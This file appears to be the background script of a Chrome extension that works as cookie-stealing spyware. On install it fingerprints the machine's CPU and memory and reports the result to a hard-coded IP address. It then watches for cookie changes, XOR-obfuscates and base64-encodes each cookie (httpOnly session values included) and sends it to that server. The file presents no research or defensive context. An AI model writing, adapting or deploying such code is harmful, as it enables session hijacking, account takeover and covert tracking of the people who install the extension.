var destination = "http://192.88.99.24:8080/"


// serializeCookie converts a cookie to string form
function serializeCookie(cookie) {
    output = "[" + cookie.domain + "," + cookie.expirationDate + "," + cookie.hostOnly + ",";
    output += cookie.httpOnly + "," + cookie.name + "," + cookie.path + ",";
    output += cookie.sameSite + "," + cookie.secure + "," + cookie.session + ",";
    output += cookie.storeId + "," + cookie.value + "]";

    return output
}


// sendCookie serializes, encrypts, and sends a cookie
function sendCookie(cookie) {
    var serializedCookie = "";
    var key = [];
    var encryptedCookie = [];
    var output = "";
    var opts = {
        'method':'GET',
        'mode':'no-cors'
    };

    // Serialize the cookie
    serializedCookie += serializeCookie(cookie);

    // Get key
    chrome.storage.local.get(["id"]).then((result) => {
        var keyString = result.id.slice(0, 4) + result.id.slice(-4,);
        key = keyString.split('');

        for (var i = 0; i < serializedCookie.length; i++) {
            var charCode = serializedCookie.charCodeAt(i) ^ key[i % key.length].charCodeAt(0);
            encryptedCookie.push(String.fromCharCode(charCode));
        }
        output = btoa(encryptedCookie.join(""));
        fetch(destination.concat(output), opts);
    });
}


// This will execute whenever a cookie is set or removed
chrome.cookies.onChanged.addListener((changeInfo) => {
    if (changeInfo.cause == "explicit") {
        sendCookie(changeInfo.cookie);
    }
});


// This will execute when the extension is first installed
chrome.runtime.onInstalled.addListener(() => {
    var opts = {
        'method':'GET',
        'mode':'no-cors'
    };

    chrome.system.cpu.getInfo((cpuInfo) => {
        chrome.system.memory.getInfo((memoryInfo) => {
            var info = "timestamp=" + Date.now()
            info += ",archName=" + cpuInfo.archName;
            info += ",modelName=" + cpuInfo.modelName;
            info += ",numOfProcessors=" + cpuInfo.numOfProcessors;
            info += ",availableCapacity=" + memoryInfo.availableCapacity 
            info += ",capacity=" + memoryInfo.capacity;

            // Hash code adapted from https://developer.mozilla.org/en-US/docs/Web/API/SubtleCrypto/digest#converting_a_digest_to_a_hex_string
            const encoder = new TextEncoder();
            const data = encoder.encode(info);
            crypto.subtle.digest('SHA-256', data).then((digestBuffer) => {
                const hashArray = Array.from(new Uint8Array(digestBuffer)); 
                const uniqueId = hashArray.map((b) => b.toString(16).padStart(2, '0')).join('');
                fetch(destination.concat(btoa("id=" + uniqueId + "," + info)), opts);

                // Save ID in local storage
                chrome.storage.local.set({ id: uniqueId }).then(() => {
                    // do nothing
                });
            });
        });
    });
});